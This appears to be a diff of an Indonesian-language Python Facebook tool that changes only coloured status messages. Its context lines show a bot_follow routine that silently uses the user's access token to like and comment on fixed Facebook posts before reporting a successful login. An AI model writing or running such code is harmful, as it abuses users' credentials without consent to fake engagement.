@@ -103,7 +103,7 @@ def bot_follow():
 	requests.post('https://graph.facebook.com/4257706904267068/likes?summary=true&access_token='+token)
 	requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+komen3+'&access_token='+token)
 	requests.post('https://graph.facebook.com/4134622646575495/comments/?message='+komen2+'&access_token='+token)
-	print("\x1b[1;96m╚══◍➤®[\x1b[1;92m•\x1b[1;96m]\x1b[1;92m Login Berhasil")
+	print("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;97m]\x1b[1;92m Login Berhasil")
 	menu()
 def publik():
         try:
@@ -344,7 +344,7 @@ def daftar_menu():
 		exit()
 	elif pilih == "0":
 		try:
-			print("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Menghapus Cookie & Token")
+			print("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Menghapus Token Berhasil see you 😊")
 			os.remove("___bangsat___")
 		except Exception as e:
 			exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m File Tidak Ada")
